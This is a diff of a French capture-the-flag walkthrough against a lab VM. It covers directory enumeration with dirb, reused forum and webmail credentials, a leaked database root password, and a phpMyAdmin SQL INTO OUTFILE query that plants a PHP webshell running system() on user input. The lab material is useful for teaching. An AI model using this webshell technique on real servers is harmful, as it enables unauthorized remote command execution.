@@ -37,7 +37,7 @@ L'adresse qui nous intéresse ici est 192.168.56.101, car c'est celle qui possè
 On prendra toujours la dernière adresse qui possede le plus de ports ouverts, son numero peut changer selon les installations.
 On l'appelera 192.168.56.#.
 
-<h1> Utiliser un 'penetration testing tools' pour trouver d'autres accès</h1>
+## Utiliser un 'penetration testing tools' pour trouver d'autres accès
 
 On utilise **[Dirb](https://www.kali.org/tools/dirb/)**, qui cher he les pages web accessibles sur l'ip fournie.
 
@@ -53,7 +53,7 @@ On utilise **[Dirb](https://www.kali.org/tools/dirb/)**, qui cher he les pages w
   ```
 On découvre ainsi l'existence d'un forum, d'un phpMyAdmin et d'un webmail.
 
-<h2> Forum </h2>
+## Forum
 
 Parmi les sujets sur le forum, lmezard en a créé un nommé "Problème login ?" dont voici un extrait:
 
@@ -71,27 +71,41 @@ L'utilisateur a entré ce qui ressemble à un password dans le champs login: `!q
 On essaie donc ce mot de passe pour l'utilisateur lmezard sur le forum via le lien 'Log in' en haut à droite de la page, ça fontionne !
 Dans les paramètres du user, on trouve aussi son mail : `laurie@borntosec.net`
 
-<h2> Webmail </h2>
+## Webmail
 
-On peut accéder au webmail précédemment decouvert (https://192.168.56.#/webmail) avec l'adresse mail et le mot de passe du forum, ça fonctionne également !
+On peut accéder au webmail (https://192.168.56.#/webmail) avec l'adresse mail et le mot de passe du forum, ça fonctionne également !
 
-On y apprend, dans les mails reçus, que l'on peut accéder à la database avec les identifiants suivants, qui sont envoyés par ft_root@mail.borntosec.net :
+On apprend dans les mails reçus que l'on peut accéder à la database avec les identifiants suivants, qui sont envoyés par ft_root@mail.borntosec.net :
 
 `root` / `Fg-'kKXBj87E:aJ$`
 
-<h2>PhpMyAdmin</h2>
+## PhpMyAdmin Webshell exploit
 
-En suivant ce lien https://192.168.56.#/phpmyadmin, on peut se connecter avec les credentials suivants :
+On peut effectivement se connecter à phpMyAdmin (https://192.168.56.#/phpmyadmin) avec les identifiants découverts.
+Après quelques recherchers, cette version de phpMyAdmin est vulnérable à un [exploit Webshell](https://www.netspi.com/blog/technical/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/). Pour pouvoir exploiter cette vulnérabilité, il va falloir trouver un dossier où l'on peut écrire.
 
-root / Fg-'kKXBj87E:aJ$
+- `dirb https://192.168.56.101/forum ~/Applications/dirb222/wordlists/common.txt -rN 403`
+  ```shell
+  [...]
+    ---- Scanning URL: https://192.168.56.101/forum/ ----
+    ==> DIRECTORY: https://192.168.56.101/forum/images/
+    ==> DIRECTORY: https://192.168.56.101/forum/includes/
+    + https://192.168.56.101/forum/index (CODE:200|SIZE:4935)
+    + https://192.168.56.101/forum/index.php (CODE:200|SIZE:4935)
+    ==> DIRECTORY: https://192.168.56.101/forum/js/
+    ==> DIRECTORY: https://192.168.56.101/forum/lang/
+    ==> DIRECTORY: https://192.168.56.101/forum/modules/
+    ==> DIRECTORY: https://192.168.56.101/forum/templates_c/
+    ==> DIRECTORY: https://192.168.56.101/forum/themes/
+    ==> DIRECTORY: https://192.168.56.101/forum/update/
+  [...]
+  ```
 
-On peut créer des fichiers dans le dossier /var/www/forum/templates_c/ grâce à la requête SQL suivante :
-
->select "\<? System('COMMANDE'); ?\>" into outfile "/var/www/forum/templates_c/#.php";
-
-COMMANDE la commande shell à exécuter par PhpMyAdmin. #.php le nom du fichier produit.
-
-On obtient donc un moyen de lancer des commandes via PhPMyAdmin et de consulter les résultats en accèdant à l'adresse "https://192.168.56.#/forum/templates_c/#.php".
+- On va tester ces dossiers pour notre exploit depuis l'onglet SQL de phpMyAdmin:
+  ```sql
+    SELECT "<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><?php if($_GET['cmd']) {​​system($_GET['cmd']);}​​ ?> </pre></BODY></HTML>" INTO OUTFILE '/var/www/<DIRECTORY>/webshell.php'
+  ```
+  - Le premier a fonctionner est le dossier forum/templates_c, on obtient donc un moyen de lancer des commandes via PhPMyAdmin à l'adresse "https://192.168.56.#/forum/templates_c/webshell.php" grâce à la fonction [system](https://www.php.net/manual/en/function.system.php) de php!
 
 Avec la commande “uname -a”, on obtient par exemple des informations sur le système, qui nous seront utiles plus tard.
 
